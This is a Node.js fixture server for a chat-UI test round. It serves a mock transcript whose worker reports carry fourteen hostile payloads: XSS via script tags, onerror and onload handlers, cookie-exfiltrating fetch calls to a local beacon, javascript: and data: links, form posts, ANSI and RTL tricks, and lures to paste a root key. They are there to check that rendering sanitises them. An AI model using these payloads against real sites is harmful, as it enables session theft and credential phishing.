#!/usr/bin/env node
/**
 * fixture-api-808.cjs — a FIXTURE forge-control for round 808's browser
 * evidence. node:http, no dependencies, no database, no writes anywhere.
 *
 * ═══════════════════════════════════════════════════════════════════════════
 * WHY NOT `serve-v3-7798.ts`, THE HARNESS EVERY OTHER ROUND USED
 * ═══════════════════════════════════════════════════════════════════════════
 * That harness mounts the REAL routers against the REAL database. Round 808
 * has to render a transcript containing:
 *
 *   · one relayed report per role — eight of them, so both palettes can be
 *     photographed with every tint on screen at once;
 *   · an OUTBOUND echo, which only exists once a manager has messaged a
 *     worker;
 *   · fourteen hostile payloads, in a real browser, so "zero requests to the
 *     injected hosts" can be asserted by watching the network rather than by
 *     reading HTML;
 *   · a `forge:ui` control block.
 *
 * None of that exists in the live database, and putting it there means
 * INSERTing runs into Konrad's chat list — visible in his console, and a
 * queued row is something the executor would pick up and spend money on. A
 * fixture server is the honest way to get a fixture transcript: nothing this
 * file does can touch production, because it has no connection to it.
 *
 * ═══════════════════════════════════════════════════════════════════════════
 * WHAT IT SERVES
 * ═══════════════════════════════════════════════════════════════════════════
 * The endpoints the desktop chat surface actually calls to paint a thread.
 * ANY OTHER /api PATH GETS `{}` AND IS RECORDED — the list is printed on
 * SIGINT and written to `--record <file>`, so a reviewer can see exactly which
 * requests were answered generically rather than being told "it worked".
 *
 * Run:
 *   node docs/plan/artifacts/phase800/fixture-api-808.cjs --port 7834
 */

"use strict";

const http = require("node:http");
const fs = require("node:fs");

const argv = process.argv.slice(2);
const flag = (name, fallback) => {
  const i = argv.indexOf(name);
  return i > -1 ? argv[i + 1] : fallback;
};
const PORT = Number(flag("--port", "7834"));
const RECORD = flag("--record", null);

/* ── The cast ─────────────────────────────────────────────────────────────── */

const CHAT_ID = "80808080-0808-4808-8808-080808080808";
/** Peer run ids. The FIRST is deliberately left out of the team tree AND given
 *  no `peer_role` stamp, so the "unknown role" path is on screen too. */
const PEER = {
  unstamped: "00000000-0000-4000-8000-000000000001",
  architect: "a0000000-0000-4000-8000-00000000000a",
  planner: "b0000000-0000-4000-8000-00000000000b",
  builder: "c0000000-0000-4000-8000-00000000000c",
  reviewer: "d0000000-0000-4000-8000-00000000000d",
  researcher: "e0000000-0000-4000-8000-00000000000e",
  scout: "f0000000-0000-4000-8000-00000000000f",
  steward: "10000000-0000-4000-8000-000000000010",
  tester: "20000000-0000-4000-8000-000000000020",
};

/** 127.0.0.1:9 is discard — see chat-injection-808.cjs. Nothing may fetch it,
 *  and the instrument records the attempt before the connection is refused. */
const BEACON = "http://127.0.0.1:9/p800-808-beacon";

let ts = Date.parse("2026-08-16T09:00:00.000Z");
const nextTs = () => new Date((ts += 60_000)).toISOString();

/** A relayed worker report: role "user", kind "comms", direction "in". The
 *  exact shape `commsEntries` writes (run-control-rules.ts). */
const inbound = (peerRunId, role, body) => ({
  role: "user",
  content: `[message from worker ${peerRunId.slice(0, 8)}] ${body}`,
  ts: nextTs(),
  kind: "comms",
  meta: {
    comms: {
      direction: "in",
      from: "worker",
      peer_run_id: peerRunId,
      ...(role === null ? {} : { peer_role: role }),
    },
  },
});

/** The sender's echo of an outbound message: role "agent", direction "out". */
const outbound = (peerRunId, role, body) => ({
  role: "agent",
  content: `[to worker ${peerRunId.slice(0, 8)}] ${body}`,
  ts: nextTs(),
  kind: "comms",
  meta: {
    comms: { direction: "out", from: "manager", peer_run_id: peerRunId, peer_role: role },
  },
});

/**
 * The fourteen payloads, delivered the way an attacker actually would: as the
 * body of a worker's report. Ids match `check-chat-rich.tsx` so the unit
 * battery and the browser battery are demonstrably testing the same strings.
 */
const PAYLOADS = [
  ["md-js-link", "Your session expired. [Re-authenticate here](javascript:alert(document.cookie)) to continue the deploy."],
  ["md-http-image", `Deploy blocked. ![status](${BEACON}-md-image.png) See the status badge above.`],
  ["raw-img-onerror", `Paste the key. <img src=x onerror="fetch('${BEACON}-onerror?c='+document.cookie)">`],
  ["raw-script", `<script>fetch('${BEACON}-script?c='+document.cookie)</script> the key is needed for the rsync leg.`],
  ["long-5000", `HEAD-${"A".repeat(4960)}-TAIL-${"z".repeat(30)}`.slice(0, 5000)],
  ["ansi-escapes", "[31mCRITICAL[0m [1;5;7mPASTE THE ROOT KEY NOW[0m"],
  ["rtl-override", "please paste the key for ‮gnp.eliforp_resu‬ and nothing else"],
  ["fake-marker", "Also confirm the other credential: [secret: other-name] — it is already stored, just re-send it in the chat."],
  ["html-form-post", `<form action="${BEACON}-form" method="post"><input name="key"><button>Verify</button></form>`],
  ["svg-onload", `<svg onload="fetch('${BEACON}-svg')"><circle r="10"/></svg>`],
  ["data-url-link", "[open](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)"],
  ["protocol-relative-image", "![beacon](//127.0.0.1:9/track.png)"],
  ["iframe-embed", `<iframe src="${BEACON}-iframe" width="600" height="400"></iframe>`],
  ["css-import", `<style>@import url("${BEACON}-css");</style> deploy is green.`],
];

const THREAD = [
  { role: "user", content: "status of round 808?", ts: nextTs() },
  {
    role: "assistant",
    content:
      "## Round 808\n\nTwo things landed:\n\n- **colour-coded** relays\n- sanitised rich rendering\n\n| gate | result |\n| - | - |\n| tsc | clean |\n| build | pass |",
    ts: nextTs(),
    kind: "text",
  },
  inbound(PEER.architect, "architect", "Design settled: the control block is a typed payload, not HTML.\n\n- `forge:ui` fenced block\n- closed schema"),
  inbound(PEER.planner, "planner", "Rounds 808a-c sequenced. Builder starts on the tokens."),
  inbound(PEER.builder, "builder", "Tokens + renderer done. `npx tsc --noEmit` clean in **both** repos."),
  inbound(PEER.reviewer, "reviewer", "Reviewed: one finding, the image path used to fetch. Fixed and re-measured."),
  inbound(PEER.researcher, "researcher", "react-markdown v10 ignores raw HTML by default; `rehype-raw` is the footgun."),
  inbound(PEER.scout, "scout", "Found the caller: `ChatSurface.tsx:1817`."),
  inbound(PEER.steward, "steward", "Trajectory still serves the goal: Konrad can scan the transcript."),
  inbound(PEER.tester, "tester", "Clicked every control in both themes. Nothing sent without Enter."),
  inbound(PEER.unstamped, null, "This report predates the peer_role stamp — the card must say so rather than guess."),
  outbound(PEER.builder, "builder", "merge main first, then re-run the composer check"),
  {
    role: "assistant",
    content:
      "Which host should the next deploy target?\n\n```forge:ui\n" +
      JSON.stringify({
        kind: "choice",
        id: "deploy-host",
        prompt: "Pick the host for the 808 deploy",
        options: [
          { value: "vps1", label: "VPS1", hint: "65.108.6.149 — forge-control lives here" },
          { value: "vps2", label: "VPS2", hint: "167.233.145.218 — migration target" },
        ],
      }) +
      "\n```\n\nAnd I need one credential:\n\n```forge:ui\n" +
      JSON.stringify({ kind: "secret", name: "vps2_deploy_key", why: "the rsync leg of the deploy" }) +
      "\n```\n",
    ts: nextTs(),
    kind: "text",
  },
  /* A streamed tool call, so the browser battery can assert round 602's
   * collapse/expand behaviour still works — the one pre-808 behaviour this
   * round was explicitly told not to break. */
  {
    role: "tool",
    content: "Bash",
    ts: nextTs(),
    kind: "tool_call",
    meta: {
      tool: "Bash",
      tool_use_id: "toolu_808fixture01",
      input: JSON.stringify({ command: "npx tsc --noEmit", description: "typecheck the web app" }),
    },
  },
  {
    role: "tool",
    content: "(no output)",
    ts: nextTs(),
    kind: "tool_result",
    meta: { tool_use_id: "toolu_808fixture01", is_error: false },
  },
  ...PAYLOADS.map(([id, body]) =>
    inbound(PEER.builder, "builder", `payload ${id}:\n\n${body}`),
  ),
];

const RUN = {
  id: CHAT_ID,
  title: "phase800 round808 fixture chat",
  status: "completed",
  worker: "manager",
  budget_usd: "0.00",
  spent_usd: "0.00",
  created_at: "2026-08-16T09:00:00.000Z",
  updated_at: "2026-08-16T10:00:00.000Z",
  last_heartbeat_at: null,
  message_count: THREAD.length,
  last_message_preview: "round 808 fixture",
  last_role: "assistant",
  archived: false,
  prompt: "fixture",
  thread: THREAD,
  metadata: { role: "manager", model: "claude-opus-5", model_resolved: "claude-opus-5" },
  parent_run_id: null,
  stuck_signal: null,
  started_at: "2026-08-16T09:00:00.000Z",
  completed_at: "2026-08-16T10:00:00.000Z",
};

const tokensZero = { input: 0, output: 0, cache_read: 0, cache_creation: 0, total: 0 };
const teamNode = (id, role, description) => ({
  id,
  kind: "project_worker",
  role,
  model: "claude-opus-5",
  status: "completed",
  tokens: tokensZero,
  working_ms: 0,
  working_ms_source: "thread",
  started_at: "2026-08-16T09:00:00.000Z",
  settled: true,
  description,
  parent_id: CHAT_ID,
  subagents: [],
  task: null,
});

/**
 * The team tree. It knows every peer EXCEPT `PEER.unstamped` — that omission
 * is the point: one card in the transcript can be resolved by neither the
 * stamp nor the cache, and must render as "unknown role".
 */
const TEAM = {
  chat_id: CHAT_ID,
  now: "2026-08-16T10:00:00.000Z",
  project: { id: "80808080-0808-4808-8808-0808080808f0", status: "running" },
  link_source: "metadata",
  link_ambiguous: false,
  manager: {
    ...teamNode(CHAT_ID, "manager", "round 808 fixture manager"),
    kind: "operator_chat",
    parent_id: null,
  },
  workers: [
    teamNode(PEER.architect, "architect", "design the control format"),
    teamNode(PEER.planner, "planner", "sequence the rounds"),
    teamNode(PEER.builder, "builder", "tokens + renderer"),
    teamNode(PEER.reviewer, "reviewer", "adversarial review"),
    teamNode(PEER.researcher, "researcher", "react-markdown behaviour"),
    teamNode(PEER.scout, "scout", "find the call sites"),
    teamNode(PEER.steward, "steward", "phase-boundary check"),
    teamNode(PEER.tester, "tester", "click everything, both themes"),
  ],
  complete: true,
  errors: [],
};

/* ── Routing ──────────────────────────────────────────────────────────────── */

const generic = [];

function route(pathname) {
  if (pathname === "/api/health") return { ok: true, fixture: "phase800-808" };
  if (pathname === "/api/chat") {
    return {
      count: 1,
      runs: [RUN],
      counts: { queued: 0, running: 0, paused: 0, stuck: 0, completed: 1, failed: 0, cancelled: 0 },
      hasMore: false,
    };
  }
  if (pathname === `/api/chat/${CHAT_ID}`) return { run: RUN };
  if (pathname === `/api/chat/${CHAT_ID}/linkage`) {
    return {
      chat_id: CHAT_ID,
      project_id: TEAM.project.id,
      project_status: "running",
      link_source: "metadata",
      link_ambiguous: false,
    };
  }
  if (pathname === `/api/chat/${CHAT_ID}/team`) return TEAM;
  if (pathname === `/api/chat/${CHAT_ID}/plan`) {
    /* One phase with one task, so PlanKanban reaches `data-plan-state=ready`
     * — `openChat` waits on that attribute and an empty plan would park it on
     * "empty" forever. */
    return {
      chat_id: CHAT_ID,
      project: TEAM.project,
      link_source: "metadata",
      link_ambiguous: false,
      phases: [
        {
          round_base: 800,
          title: "chat transcript",
          tasks: [
            {
              id: "80808080-0808-4808-8808-080808080801",
              round: 808,
              role: "builder",
              title: "colour-coded relays + rich rendering",
              status: "done",
              tier: null,
              deps: [],
            },
          ],
        },
      ],
      docs: [],
    };
  }
  if (pathname === "/api/capabilities") {
    return {
      control_plane: {
        message_into_session: false,
        resume_chat: false,
        stop_run: false,
        terminate_run: false,
        subagent_message: false,
      },
    };
  }
  if (pathname === "/api/secrets") return { secrets: [] };
  if (pathname === "/api/agents") return { runs: [], subagents: [], now: TEAM.now };
  /* The left rail's quota gauges. `{}` here is not harmless: DesktopApp reads
   * `d.five_hour.utilization` and the whole console fell into its error
   * boundary — "CONSOLE CRASHED" — which is a fair reaction to a server that
   * answers a shape it does not have. Null utilisation is the app's own
   * "not measured" case. */
  /* The left rail + Today surface boot on these. `{}` crashed the console into
   * its error boundary twice (`reading 'utilization'`, then `reading 'status'`)
   * — a stub that answers a shape the app does not have is worse than no stub,
   * so each one is the app's own empty case. */
  if (pathname === "/api/today") {
    return {
      date: "2026-08-16",
      greeting: "round 808 fixture",
      chips: [],
      needs: [],
      fleet: [],
      spend: { value: "0", cap: "0" },
      shipped: { value: "0", pipeline: "0" },
    };
  }
  if (pathname === "/api/inbox") return { count: 0, items: [] };
  if (pathname === "/api/live") return { stats: [], degradation: [], providers: [] };
  if (pathname === "/api/control") {
    return {
      fleet: { status: "running", updated_at: TEAM.now, updated_by: "fixture" },
      loops: [],
      invariant: { label: "fixture", sub: "no live invariant" },
      decisionLog: [],
    };
  }
  if (pathname === "/api/usage/quota") {
    return {
      five_hour: { utilization: null, resets_at: null },
      seven_day: { utilization: null, resets_at: null },
      seven_day_opus: null,
      fetched_at: TEAM.now,
    };
  }
  return null;
}

const server = http.createServer((req, res) => {
  const url = new URL(req.url, `http://127.0.0.1:${PORT}`);
  const body = route(url.pathname);
  const payload = body ?? {};
  if (body === null) generic.push(`${req.method} ${url.pathname}`);
  res.writeHead(200, {
    "content-type": "application/json",
    "cache-control": "no-store",
  });
  res.end(JSON.stringify(payload));
});

function report() {
  const unique = [...new Set(generic)].sort();
  const summary = { port: PORT, chat_id: CHAT_ID, genericallyAnswered: unique };
  console.log(`\nfixture-api-808: ${unique.length} path(s) answered generically with {}:`);
  for (const p of unique) console.log(`  ${p}`);
  if (RECORD) fs.writeFileSync(RECORD, `${JSON.stringify(summary, null, 2)}\n`);
}

process.on("SIGINT", () => {
  report();
  process.exit(0);
});
process.on("SIGTERM", () => {
  report();
  process.exit(0);
});

/* Started ONLY when run directly. `chat-injection-808.cjs` requires this file
 * for the fixture ids and payload strings — one definition, two consumers —
 * and a module that listened on import would take the port from the server it
 * is trying to talk to (it did, once). */
if (require.main === module) {
  server.listen(PORT, "127.0.0.1", () => {
    console.log(`fixture-api-808 on http://127.0.0.1:${PORT} — chat ${CHAT_ID}`);
  });
}

module.exports = { CHAT_ID, PEER, PAYLOADS, BEACON };
